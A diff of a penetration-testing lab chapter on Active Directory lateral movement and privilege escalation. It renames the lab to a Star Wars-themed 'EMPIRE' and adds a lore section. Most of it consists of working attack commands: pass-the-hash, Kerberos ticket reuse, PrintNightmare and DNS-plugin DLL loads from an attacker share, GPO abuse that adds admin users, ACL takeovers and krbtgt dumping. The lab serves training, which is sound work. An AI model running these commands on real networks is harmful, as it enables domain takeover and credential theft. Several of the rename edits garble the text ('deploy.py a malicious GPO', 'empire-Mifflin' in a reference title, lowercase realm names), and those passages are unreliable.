@@ -12,7 +12,7 @@ This chapter covers **LAT-001..035** and **PE-001..060** in `PLAN.md`. It is the
 
 ## 11.0.1 (BloodHound) Lab Specific ACL Paths
 
-Before diving into host-level escalation, here is the explicit BloodHound path mapping for domain-level privilege escalation in the DVAD environment. These are the chains you will be executing:
+Before diving into host-level escalation, here is the explicit BloodHound path mapping for domain-level privilege escalation in the EMPIRE environment. These are the chains you will be executing:
 
 ```mermaid
 graph LR
@@ -100,7 +100,7 @@ Save the orientation output to disk **on the attacker side** so you don't risk l
 
 ```bash
 # From attacker, via SMB share of writable dir
-smbclient -U peter.parker%'DVADlab2024!' //file01/share$ -c 'get oriented.txt'
+smbclient -U peter.parker%'EmpireLab2024!' //scarif/share$ -c 'get oriented.txt'
 ```
 
 ---
@@ -116,7 +116,7 @@ smbclient -U peter.parker%'DVADlab2024!' //file01/share$ -c 'get oriented.txt'
 | `atexec.py` | Task Scheduler RPC | NTLM/Kerberos | SYSTEM (task) | RPC to ATSvc, ADMIN$ | 4698 (scheduled task created) |
 | `evil-winrm` | WinRM (HTTP/HTTPS) | NTLM/Kerberos/Cert | interactive PS | WinRM on 5985/5986, member of Remote Management Users or admin | 4624 LogonType 3, 4688 wsmprovhost.exe |
 | RDP (`xfreerdp`) | RDP | NTLM/Kerberos/RestrictedAdmin | interactive desktop | RDP enabled, member of Remote Desktop Users or admin | 4624 LogonType 10 |
-| SSH | SSH | password/key | shell | OpenSSH on file01 | sshd / Application log |
+| SSH | SSH | password/key | shell | OpenSSH on scarif | sshd / Application log |
 | `nxc smb -x` | SMB | NTLM/Kerberos | one-shot cmd | ADMIN$ + service create | same as psexec |
 | `Invoke-Command` (WinRM via PS) | WinRM | NTLM/Kerberos | scriptblock | WinRM, admin or RM group | same as evil-winrm |
 
@@ -143,12 +143,12 @@ You have an NT hash, not a password:
 
 ```bash
 # Per-tool catalogue
-impacket-psexec -hashes :<NT> 'corp.local/Administrator@10.10.0.13'
-impacket-wmiexec -hashes :<NT> 'corp.local/Administrator@10.10.0.13'
-impacket-smbclient -hashes :<NT> 'corp.local/Administrator@10.10.0.13'
-impacket-smbexec -hashes :<NT> 'corp.local/Administrator@10.10.0.13'
-impacket-dcomexec -hashes :<NT> 'corp.local/Administrator@10.10.0.13'
-impacket-atexec -hashes :<NT> 'corp.local/Administrator@10.10.0.13' 'whoami'
+impacket-psexec -hashes :<NT> 'empire.local/Administrator@10.10.0.13'
+impacket-wmiexec -hashes :<NT> 'empire.local/Administrator@10.10.0.13'
+impacket-smbclient -hashes :<NT> 'empire.local/Administrator@10.10.0.13'
+impacket-smbexec -hashes :<NT> 'empire.local/Administrator@10.10.0.13'
+impacket-dcomexec -hashes :<NT> 'empire.local/Administrator@10.10.0.13'
+impacket-atexec -hashes :<NT> 'empire.local/Administrator@10.10.0.13' 'whoami'
 evil-winrm -i 10.10.0.13 -u Administrator -H <NT>
 nxc smb 10.10.0.13 -u Administrator -H <NT> -x 'whoami'
 nxc winrm 10.10.0.13 -u Administrator -H <NT> -x 'whoami'
@@ -180,15 +180,15 @@ You have a Kerberos ticket (Golden, Silver, S4U-derived, stolen) or an AES key.
 export KRB5CCNAME=/tmp/Administrator.ccache
 
 # psexec with kerberos
-impacket-psexec -k -no-pass 'corp.local/Administrator@dc01.corp.local'
+impacket-psexec -k -no-pass 'empire.local/Administrator@coruscant.empire.local'
 
 # evil-winrm with kerberos
-KRB5CCNAME=/tmp/dc01-admin.ccache evil-winrm -i dc01.corp.local -u Administrator -r corp.local
+KRB5CCNAME=/tmp/coruscant-admin.ccache evil-winrm -i coruscant.empire.local -u Administrator -r empire.local
 
 # Direct AES key (PTK)
-impacket-getTGT -aesKey <AES256> 'corp.local/Administrator'
+impacket-getTGT -aesKey <AES256> 'empire.local/Administrator'
 export KRB5CCNAME=Administrator.ccache
-impacket-psexec -k -no-pass 'corp.local/Administrator@dc01.corp.local'
+impacket-psexec -k -no-pass 'empire.local/Administrator@coruscant.empire.local'
 ```
 
 ### krb5.conf — the under-the-hood requirement
@@ -198,33 +198,33 @@ evil-winrm Kerberos auth requires `krb5.conf` properly set up:
 ```ini
 # /etc/krb5.conf
 [libdefaults]
-    default_realm = CORP.LOCAL
+    default_realm = empire.local
     dns_lookup_kdc = false
     dns_lookup_realm = false
     udp_preference_limit = 0
     rdns = false
 
 [realms]
-    CORP.LOCAL = {
+    empire.local = {
         kdc = 10.10.0.10
         admin_server = 10.10.0.10
     }
-    FINANCE.LOCAL = {
+    rebel.local = {
         kdc = 10.20.0.10
         admin_server = 10.20.0.10
     }
-    ROOT.CORP = {
+    trade.corp = {
         kdc = 10.30.0.10
         admin_server = 10.30.0.10
     }
 
 [domain_realm]
-    .corp.local = CORP.LOCAL
-    corp.local = CORP.LOCAL
-    .finance.local = FINANCE.LOCAL
-    finance.local = FINANCE.LOCAL
-    .root.corp = ROOT.CORP
-    root.corp = ROOT.CORP
+    .empire.local = empire.local
+    empire.local = empire.local
+    .rebel.local = rebel.local
+    rebel.local = rebel.local
+    .trade.corp = trade.corp
+    trade.corp = trade.corp
 ```
 
 `udp_preference_limit = 0` forces TCP — important for large tickets (>1400 bytes) that won't fit in a single UDP packet.
@@ -416,9 +416,9 @@ You get every domain user's NT hash + krbtgt → game over.
 Members can configure non-AD services on DCs. Change the binary path of an innocent service, restart, get SYSTEM on DC:
 
 ```cmd
-sc.exe \\dc01 config Browser binPath= "C:\Windows\Temp\evil.exe"
-sc.exe \\dc01 stop Browser
-sc.exe \\dc01 start Browser
+sc.exe \\coruscant config Browser binPath= "C:\Windows\Temp\evil.exe"
+sc.exe \\coruscant stop Browser
+sc.exe \\coruscant start Browser
 ```
 
 (Stopping NTDS is rejected; use a stoppable, less critical service.)
@@ -430,7 +430,7 @@ sc.exe \\dc01 start Browser
 Can load arbitrary printer drivers → PrintNightmare → SYSTEM on DC.
 
 ```bash
-python3 CVE-2021-1675.py corp.local/peter.parker:'DVADlab2024!'@10.10.0.10 '\\10.10.0.1\share\evil.dll'
+python3 CVE-2021-1675.py empire.local/peter.parker:'EmpireLab2024!'@10.10.0.10 '\\10.10.0.1\share\evil.dll'
 ```
 
 [Flag: PE-011 — Print Operators driver load]
@@ -455,7 +455,7 @@ net group "GPO Editors" stepping /add /domain
 Can configure DNS service-level DLL plugins on DC:
 
 ```cmd
-dnscmd dc01 /config /serverlevelplugindll \\10.10.0.1\share\evil.dll
+dnscmd coruscant /config /serverlevelplugindll \\10.10.0.1\share\evil.dll
 sc stop DNS
 sc start DNS
 ```
@@ -472,7 +472,7 @@ sudo impacket-smbserver share /tmp/share -smb2support
 
 ### Group Policy Creator Owners — PE-014
 
-Can create GPOs. Pair with a `gPLink` write on an OU to deploy a malicious GPO. Often combined with SharpGPOAbuse.
+Can create GPOs. Pair with a `gPLink` write on an OU to deploy.py a malicious GPO. Often combined with SharpGPOAbuse.
 
 ```powershell
 SharpGPOAbuse.exe --AddComputerScript --GPOName "Evil GPO" --ScriptName evil.bat --ScriptContents 'net user evil P@ss /add; net localgroup Administrators evil /add'
@@ -518,8 +518,8 @@ All-of-everything in one domain. The usual target.
 See chapter 4 / 12 for the deep flow. The escalation use is to *seed* persistent privilege as you also use it for re-entry.
 
 ```bash
-bloodyAD -d corp.local -u peter.parker -p 'DVADlab2024!' --host 10.10.0.10 \
-    add genericAll 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' peter.parker
+bloodyAD -d empire.local -u peter.parker -p 'EmpireLab2024!' --host 10.10.0.10 \
+    add genericAll 'CN=AdminSDHolder,CN=System,DC=empire,DC=local' peter.parker
 ```
 
 [Flag: PE-020 / PER-014 — AdminSDHolder ACE]
@@ -543,8 +543,8 @@ SharpGPOAbuse.exe --AddImmediateTask --TaskName "Daily Sync" --Author "NT AUTHOR
 ### pyGPOAbuse / bloodyAD
 
 ```bash
-python3 pygpoabuse.py corp.local/peter.parker:'DVADlab2024!' -gpo-id <GUID> -f
-bloodyAD -d corp.local -u peter.parker -p 'DVADlab2024!' --host 10.10.0.10 \
+python3 pygpoabuse.py empire.local/peter.parker:'EmpireLab2024!' -gpo-id <GUID> -f
+bloodyAD -d empire.local -u peter.parker -p 'EmpireLab2024!' --host 10.10.0.10 \
     gpoadd  ...  # newer bloodyAD versions
 ```
 
@@ -589,34 +589,34 @@ You have a privileged ACE on a target object. Use it.
 
 ```bash
 # Password reset
-bloodyAD -d corp.local -u peter.parker -p 'DVADlab2024!' --host 10.10.0.10 \
+bloodyAD -d empire.local -u peter.parker -p 'EmpireLab2024!' --host 10.10.0.10 \
     set password victim 'NewPass1!'
-net rpc password victim 'NewPass1!' -U corp.local/peter.parker%'DVADlab2024!' -S 10.10.0.10
+net rpc password victim 'NewPass1!' -U empire.local/peter.parker%'EmpireLab2024!' -S 10.10.0.10
 
 # Add to group
-bloodyAD -d corp.local -u peter.parker -p 'DVADlab2024!' --host 10.10.0.10 \
+bloodyAD -d empire.local -u peter.parker -p 'EmpireLab2024!' --host 10.10.0.10 \
     add groupMember "Domain Admins" peter.parker
-net rpc group addmem "Domain Admins" peter.parker -U corp.local/peter.parker%'DVADlab2024!' -S 10.10.0.10
+net rpc group addmem "Domain Admins" peter.parker -U empire.local/peter.parker%'EmpireLab2024!' -S 10.10.0.10
 
 # Set SPN
-bloodyAD -d corp.local -u peter.parker -p 'DVADlab2024!' --host 10.10.0.10 \
-    add objectAttribute victim servicePrincipalName 'cifs/anything.corp.local'
+bloodyAD -d empire.local -u peter.parker -p 'EmpireLab2024!' --host 10.10.0.10 \
+    add objectAttribute victim servicePrincipalName 'cifs/anything.empire.local'
 
 # Plant Shadow Credential
-certipy shadow auto -u peter.parker@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 -account victim$
+certipy shadow auto -u peter.parker@empire.local -p 'EmpireLab2024!' -dc-ip 10.10.0.10 -account victim$
 
 # Set RBCD
-bloodyAD -d corp.local -u peter.parker -p 'DVADlab2024!' --host 10.10.0.10 \
-    set rbcd FILE01$ EVIL$
-impacket-rbcd corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10 \
-    -delegate-from 'EVIL$' -delegate-to 'FILE01$' -action write
+bloodyAD -d empire.local -u peter.parker -p 'EmpireLab2024!' --host 10.10.0.10 \
+    set rbcd scarif$ EVIL$
+impacket-rbcd empire.local/peter.parker:'EmpireLab2024!' -dc-ip 10.10.0.10 \
+    -delegate-from 'EVIL$' -delegate-to 'scarif$' -action write
 
 # WriteDacl → grant yourself GenericAll
-bloodyAD -d corp.local -u peter.parker -p 'DVADlab2024!' --host 10.10.0.10 \
+bloodyAD -d empire.local -u peter.parker -p 'EmpireLab2024!' --host 10.10.0.10 \
     add genericAll victim peter.parker
 
 # WriteOwner → take ownership
-bloodyAD -d corp.local -u peter.parker -p 'DVADlab2024!' --host 10.10.0.10 \
+bloodyAD -d empire.local -u peter.parker -p 'EmpireLab2024!' --host 10.10.0.10 \
     set owner victim peter.parker
 # Then WriteDacl, then GenericAll, then anything.
 ```
@@ -625,19 +625,19 @@ bloodyAD -d corp.local -u peter.parker -p 'DVADlab2024!' --host 10.10.0.10 \
 
 ```cypher
 // BloodHound: every ACE peter.parker has on any object
-MATCH p=(u:User {name:'ALICE@CORP.LOCAL'})-[r]->(o)
+MATCH p=(u:User {name:'ALICE@empire.local'})-[r]->(o)
 WHERE type(r) IN ['GenericAll','GenericWrite','WriteDacl','WriteOwner',
                    'AddMember','ForceChangePassword','AllExtendedRights',
                    'AddKeyCredentialLink','WriteSPN','AddAllowedToAct']
 RETURN p
 ```
 
-*(Note: Within the DVAD BloodHound map, look out for specifically crafted chains such as `developer1` having `ForceChangePassword` on `nick.fury`, `nick.fury` having `WriteOwner` over `Domain Admins`, or `peter.parker` holding `GenericAll` over `tony.stark`.)*
+*(Note: Within the EMPIRE BloodHound map, look out for specifically crafted chains such as `developer1` having `ForceChangePassword` on `nick.fury`, `nick.fury` having `WriteOwner` over `Domain Admins`, or `peter.parker` holding `GenericAll` over `tony.stark`.)*
 
 Or:
 
 ```bash
-bloodyAD -d corp.local -u peter.parker -p 'DVADlab2024!' --host 10.10.0.10 \
+bloodyAD -d empire.local -u peter.parker -p 'EmpireLab2024!' --host 10.10.0.10 \
     get writable
 ```
 
@@ -645,18 +645,18 @@ bloodyAD -d corp.local -u peter.parker -p 'DVADlab2024!' --host 10.10.0.10 \
 
 ---
 
-## 11.10 PE on member servers — DVAD specifics
+## 11.10 PE on member servers — EMPIRE specifics
 
-The DVAD member servers each have a tailored privesc:
+The EMPIRE member servers each have a tailored privesc:
 
-### file01
+### scarif
 
 - An executable in `C:\Program Files\Vendor\` with weak ACLs (PE-005-style binary hijack).
 - Possibly an `unattend.xml` left in `C:\Windows\Panther\` containing a local-admin password.
 - `WebClient` service running (enables HTTP-based coercion).
 - SeBackupPrivilege not granted; needs Backup Operators membership for SAM/SYSTEM extract.
 
-### sql01
+### kamino
 
 - MSSQL `xp_cmdshell` with `sa` → SYSTEM if you crack the `sa` password.
 - `TRUSTWORTHY` database chain (see chapter 10).
@@ -666,22 +666,22 @@ The DVAD member servers each have a tailored privesc:
 EXEC xp_cmdshell 'C:\Users\Public\PrintSpoofer.exe -i -c "net user evil P@ss /add"'
 ```
 
-### ws01
+### tatooine
 
 - `AlwaysInstallElevated=1`.
 - Scheduled task running as SYSTEM with writable PS1 script in `C:\Tasks\`.
 - LAPS NOT configured for this host — local admin static.
-- Possibly Defender RealTimeProtection disabled (a DVAD intentional pattern).
+- Possibly Defender RealTimeProtection disabled (a EMPIRE intentional pattern).
 
 Check `PLAN.md` for the canonical PE list per host.
 
-[Flags: PE-031 (file01), PE-032 (sql01), PE-033 (ws01)]
+[Flags: PE-031 (scarif), PE-032 (kamino), PE-033 (tatooine)]
 
 ---
 
-## 11.11 SSH lateral to file01 — LAT-030
+## 11.11 SSH lateral to scarif — LAT-030
 
-DVAD's file01 may run an OpenSSH for Windows service. Move laterally:
+EMPIRE's scarif may run an OpenSSH for Windows service. Move laterally:
 
 ```bash
 ssh peter.parker@10.10.0.13
@@ -694,7 +694,7 @@ OpenSSH-for-Windows defaults: keys in `C:\Users\<user>\.ssh\authorized_keys`. Th
 
 You can drop your pubkey there if you're already local admin → persistence (chapter 12).
 
-[Flag: LAT-030 — SSH lateral file01]
+[Flag: LAT-030 — SSH lateral scarif]
 
 ---
 
@@ -763,7 +763,7 @@ Use atexec when the target's WMI is busted or you don't want a service install.
 
 ### evil-winrm — what it does on the wire
 
-WinRM is SOAP-over-HTTP(S) on 5985/5986. Auth via NTLM (default) or Kerberos (`-r corp.local`). Session is an interactive shell hosted by `wsmprovhost.exe`.
+WinRM is SOAP-over-HTTP(S) on 5985/5986. Auth via NTLM (default) or Kerberos (`-r empire.local`). Session is an interactive shell hosted by `wsmprovhost.exe`.
 
 ```
 [Wire footprint]
@@ -779,7 +779,7 @@ WinRM is SOAP-over-HTTP(S) on 5985/5986. Auth via NTLM (default) or Kerberos (`-
 ### `runas /netonly` (when you have a different cred set than your shell)
 
 ```cmd
-runas /netonly /user:corp.local\peter.parker powershell.exe
+runas /netonly /user:empire.local\peter.parker powershell.exe
 # In the spawned shell, all network calls use peter.parker's creds; local calls still use original
 ```
 
@@ -796,13 +796,13 @@ Steals an existing primary or impersonation token from another process — works
 
 ```powershell
 $cred = New-Object System.Management.Automation.PSCredential('corp\tony.stark',(ConvertTo-SecureString 'P@ss' -AsPlainText -Force))
-Invoke-Command -ComputerName file01 -Credential $cred -ScriptBlock { whoami }
+Invoke-Command -ComputerName scarif -Credential $cred -ScriptBlock { whoami }
 ```
 
 ### `New-PSDrive` for SMB with creds
 
 ```powershell
-New-PSDrive -Name X -PSProvider FileSystem -Root \\file01\share -Credential $cred
+New-PSDrive -Name X -PSProvider FileSystem -Root \\scarif\share -Credential $cred
 ```
 
 ---
@@ -876,7 +876,7 @@ If Tamper Protection is on, you need to disable it from Settings (interactive) o
 ### lsassy
 
 ```bash
-lsassy -u peter.parker -p 'DVADlab2024!' -d corp.local -M procdump 10.10.0.13
+lsassy -u peter.parker -p 'EmpireLab2024!' -d empire.local -M procdump 10.10.0.13
 # Methods: procdump, comsvcs, dllinject, mirrordump, dumpert, nanodump, ppldump
 ```
 
@@ -933,14 +933,14 @@ The defender's job is to break the chain at the tier boundary. Each ACL drift ac
 ```
 1. peter.parker has any-user creds → BloodHound
 2. Kerberoast svc_jarvis → hashcat → SqlServer123!
-3. svc_jarvis is DA (DVAD seeds this) → impacket-secretsdump krbtgt
+3. svc_jarvis is DA (EMPIRE seeds this) → impacket-secretsdump krbtgt
 ```
 
 ### Chain B: peter.parker → DA via ESC1
 
 ```
 1. peter.parker → BloodHound → "VulnerableESC1" template
-2. certipy req with -upn administrator@corp.local
+2. certipy req with -upn administrator@empire.local
 3. certipy auth → Administrator NT hash
 4. impacket-secretsdump → krbtgt
 ```
@@ -948,10 +948,10 @@ The defender's job is to break the chain at the tier boundary. Each ACL drift ac
 ### Chain C: peter.parker → DA via Coerce + ESC8
 
 ```
-1. peter.parker → BloodHound → ESC8 vuln on CA01
-2. ntlmrelayx -t http://ca01/certsrv/ --adcs --template DomainController
-3. PetitPotam dc01 → relay → cert for DC01$
-4. certipy auth → DC01$ NT hash
+1. peter.parker → BloodHound → ESC8 vuln on endor
+2. ntlmrelayx -t http://endor/certsrv/ --adcs --template DomainController
+3. PetitPotam coruscant → relay → cert for coruscant$
+4. certipy auth → coruscant$ NT hash
 5. impacket-secretsdump krbtgt
 ```
 
@@ -960,20 +960,20 @@ The defender's job is to break the chain at the tier boundary. Each ACL drift ac
 ```
 1. peter.parker → GenericWrite on Backup-Readers group
 2. Add peter.parker to Backup-Readers
-3. gMSADumper.py → svc_backup$ NT hash (svc_backup is Backup Operators)
-4. evil-winrm to DC as svc_backup → reg save SAM SYSTEM NTDS.dit
+3. gMSADumper.py → svc_r2d2$ NT hash (svc_r2d2 is Backup Operators)
+4. evil-winrm to DC as svc_r2d2 → reg save SAM SYSTEM NTDS.dit
 5. impacket-secretsdump LOCAL → krbtgt
 ```
 
 ### Chain E: peter.parker → DA via RBCD chain (PE/LAT mix)
 
 ```
-1. peter.parker → BloodHound → GenericWrite on FILE01$
+1. peter.parker → BloodHound → GenericWrite on scarif$
 2. impacket-addcomputer EVIL$
-3. impacket-rbcd write FILE01$ ← EVIL$
-4. impacket-getST -spn cifs/file01 -impersonate Administrator
-5. Admin on file01 → mimikatz → tony.stark hash
-6. tony.stark is local admin on dc01 → PTH
+3. impacket-rbcd write scarif$ ← EVIL$
+4. impacket-getST -spn cifs/scarif -impersonate Administrator
+5. Admin on scarif → mimikatz → tony.stark hash
+6. tony.stark is local admin on coruscant → PTH
 7. reg save NTDS → secretsdump → krbtgt
 ```
 
@@ -986,7 +986,7 @@ Practice all five. They cover 80% of real engagements.
 ### Exercise 11.A — PTH lateral spray
 
 ```bash
-impacket-secretsdump -hashes :<NT_admin> 'corp.local/Administrator@10.10.0.13'
+impacket-secretsdump -hashes :<NT_admin> 'empire.local/Administrator@10.10.0.13'
 nxc smb 10.10.0.0/21 -u Administrator -H <NT> --local-auth
 ```
 
@@ -1014,15 +1014,15 @@ Pick a GPO you have write on (BloodHound: "GenericWrite on GPO"). Use SharpGPOAb
 
 ### Exercise 11.E — Potato chain
 
-On sql01, gain SQL `sa` (chapter 10). Via xp_cmdshell, drop PrintSpoofer. Escalate to SYSTEM. Mimikatz LSASS. Document the privileges of the resulting SYSTEM shell.
+On kamino, gain SQL `sa` (chapter 10). Via xp_cmdshell, drop PrintSpoofer. Escalate to SYSTEM. Mimikatz LSASS. Document the privileges of the resulting SYSTEM shell.
 
-### Exercise 11.F — UAC bypass on ws01
+### Exercise 11.F — UAC bypass on tatooine
 
-Land as a local admin on ws01 (with split token). Use fodhelper bypass to get an elevated PowerShell. Confirm `whoami /priv | findstr -i debug` shows SeDebugPrivilege enabled (high IL).
+Land as a local admin on tatooine (with split token). Use fodhelper bypass to get an elevated PowerShell. Confirm `whoami /priv | findstr -i debug` shows SeDebugPrivilege enabled (high IL).
 
 ### Exercise 11.G — LOLBin lateral
 
-Use only LOLBins (no impacket scripts) to laterally move peter.parker → tony.stark on file01. Document each step.
+Use only LOLBins (no impacket scripts) to laterally move peter.parker → tony.stark on scarif. Document each step.
 
 ### Exercise 11.H — Cross-tier path
 
@@ -1030,7 +1030,7 @@ Map the full path peter.parker (Tier-2 user) → DA (Tier-0). Identify every tie
 
 ### Exercise 11.I — Quietest psexec alternative
 
-For the same "execute `whoami /all` as Administrator on dc01", show:
+For the same "execute `whoami /all` as Administrator on coruscant", show:
 
 - psexec event footprint (7045, 4697).
 - wmiexec event footprint (4688 with wmiprvse parent).
@@ -1078,7 +1078,7 @@ Set up a deliberately convoluted ACL: `developer1` → WriteSPN on tony.stark (o
 
 ## References
 
-- **harmj0y — *Abusing Active Directory ACLs/ACEs*** — the primary reference.
+- **harmj0y — *Abusing empire-Mifflin-Active-Directory ACLs/ACEs*** — the primary reference.
 - **0xdf — *Lateral Movement: WMI* / *WMIExec*** — protocol-level reading.
 - **antonioCoco — *RoguePotato*, *PrintSpoofer*** — modern Potato chain.
 - **Microsoft Docs — *Privileged Groups*** — what each operator group can do.
@@ -1088,3 +1088,85 @@ Set up a deliberately convoluted ACL: `developer1` → WriteSPN on tony.stark (o
 - **SpecterOps — *Death Star* and *DeathStarV2*** — full automation reference.
 
 Next: [12-persistence-and-forest.md](12-persistence-and-forest.md).
+
+---
+
+# The EMPIRE AD Lab: Star Wars Lore & Thematic Mapping
+
+Welcome to the **EMPIRE AD Lab**, where the intricacies of Active Directory align with the galactic struggle between the Galactic Empire, the Rebel Alliance, and the shadow syndicates. This section provides a conceptual thematic mapping between the AD concepts you are attacking and the Star Wars universe.
+
+## The Galactic Topology
+
+The lab topology represents the political structure of the galaxy. Just as trust relationships govern AD, diplomatic and military alliances govern the galaxy.
+
+```mermaid
+graph TD
+    classDef empire fill:#000000,stroke:#ff0000,stroke-width:2px,color:#fff;
+    classDef rebel fill:#2b5c8f,stroke:#ff9900,stroke-width:2px,color:#fff;
+    classDef trade fill:#4a4a4a,stroke:#aaaaaa,stroke-width:2px,color:#fff;
+    classDef highlight fill:#440000,stroke:#ff0000,stroke-width:3px,color:#fff;
+
+    subgraph The Galactic Empire (empire.local)
+        Coruscant["Coruscant (Root DC)<br/>coruscant.empire.local"]:::empire
+        DeathStar["The Death Star (Child DC)<br/>deathstar.eu.empire.local"]:::highlight
+        Scarif["Scarif Citadel (File Server)<br/>scarif.empire.local"]:::empire
+        Kamino["Kamino Cloning Facility (SQL)<br/>kamino.empire.local"]:::empire
+        Endor["Endor Shield Generator (CA)<br/>endor.empire.local"]:::empire
+        Mandalore["Mandalore Mercenary Base (Linux)<br/>mandalore.empire.local"]:::empire
+        Coruscant -- "Imperial Command" --> DeathStar
+        Coruscant --- Scarif
+        Coruscant --- Kamino
+        Coruscant --- Endor
+        Coruscant --- Mandalore
+    end
+
+    subgraph The Rebel Alliance (rebel.local)
+        Yavin4["Yavin 4 Base<br/>yavin4.rebel.local"]:::rebel
+    end
+
+    subgraph The Trade Federation (trade.corp)
+        Neimoidia["Cato Neimoidia<br/>neimoidia.trade.corp"]:::trade
+    end
+
+    Coruscant <-->|Espionage / External Trust| Yavin4
+    Coruscant <-->|Treaty / Forest Trust| Neimoidia
+```
+
+## Infrastructure Mapping
+
+Understanding the infrastructure is key to successfully executing your attack paths. Here is how the technical components of the EMPIRE AD lab map to the Star Wars universe:
+
+### 1. The Core Domains
+* **`empire.local` (The Galactic Empire):** The central root domain. This is the seat of the Emperor and the Imperial Senate. Taking over this domain is equivalent to taking over Coruscant. It controls all the core infrastructure.
+* **`eu.empire.local` (The Death Star):** A child domain of `empire.local`. While it reports to the root domain, it holds immense power. Escaping the child domain to compromise the root domain is the equivalent of using the Death Star plans to destroy the Empire.
+* **`rebel.local` (The Rebel Alliance):** An external forest. It has an external trust with the Empire (perhaps through espionage or captured spies). Moving laterally across this trust requires finding a weak link in the Rebel defenses.
+* **`trade.corp` (The Trade Federation):** A separate forest with a bidirectional forest trust. The Empire uses them for resources, but you can forge trust tickets (Inter-Realm TGTs) to cross this boundary.
+
+### 2. High-Value Targets (Servers)
+* **`coruscant.empire.local` (Coruscant Root DC):** The ultimate prize. Achieving Domain Admin here gives you the keys to the galaxy.
+* **`endor.empire.local` (Endor Shield Generator / ADCS):** Active Directory Certificate Services. If you can compromise the CA (via ESC1, ESC8, etc.), you can forge certificates for any user in the Empire, effectively bringing down the deflector shields.
+* **`scarif.empire.local` (Scarif Citadel):** This file server hosts critical SMB shares. It is the repository of the Death Star plans. Look for exposed passwords in scripts or configuration files left by careless Imperial engineers.
+* **`kamino.empire.local` (Kamino Facility):** The SQL Server. SQL injection or xp_cmdshell here can lead to a foothold. It represents the cloning facilities—a hidden source of power.
+* **`mandalore.empire.local` (Mandalore Base):** The Linux-in-AD member. Contains local privilege escalations and cross-OS pivot opportunities. Represents the mercenary faction employed by the Empire.
+
+### 3. Attack Paths and Tactics
+* **Initial Access (The Smuggler's Route):** Finding an exposed SMB share or exploiting an LLMNR poisoning vulnerability (Responder) is like slipping past the Imperial blockade.
+* **Kerberoasting (Bounty Hunting):** Requesting TGS tickets for service accounts and cracking them offline is like putting a bounty on a high-value target and cracking their encryption.
+* **DCSync (The Force):** Using `secretsdump` to pull the `krbtgt` hash directly from the Domain Controller. It's an invisible, powerful attack that bypasses normal defenses.
+* **Golden Ticket (Order 66):** Once you have the `krbtgt` hash, you can forge a TGT for any user, granting you infinite access. It is the ultimate executive order, overriding all security protocols.
+* **Trust Abuse (Diplomatic Immunity):** Forging a trust ticket to cross from the Child Domain to the Root Domain.
+
+## The Hacker's Code (Sith vs Jedi)
+As you navigate the lab, remember that the tools you use define your path. Will you use noisy, aggressive tools (The Dark Side) that trigger every alarm, or will you use stealthy, precise tradecraft (The Light Side) to move undetected?
+
+* **The Dark Side (Noisy):** Running `BloodHound` with all collection methods, spraying passwords across the entire domain, and dropping standard Mimikatz binaries to disk. It is powerful and fast, but leaves a massive trail.
+* **The Light Side (Stealthy):** Targeted LDAP queries, memory-only execution via Covenant or Cobalt Strike, and careful evasion of logging (AMSI bypasses, ETW patching).
+
+## Flag Locations (Holocrons)
+Hidden throughout the EMPIRE AD lab are flags (Holocrons) that prove your mastery over the environment. Look for `FLAG-*.txt` files on desktops, hidden SMB shares, and within the SQL databases. 
+
+**Remember:** 
+* "Your focus determines your reality." - Qui-Gon Jinn. Focus on the attack paths mapped out in `PLAN.md`.
+* "I find your lack of faith disturbing." - Darth Vader. If an exploit fails, check your syntax, your targeting, and the underlying misconfiguration. The lab is intentionally vulnerable.
+
+May the Force be with you as you conquer the EMPIRE AD!
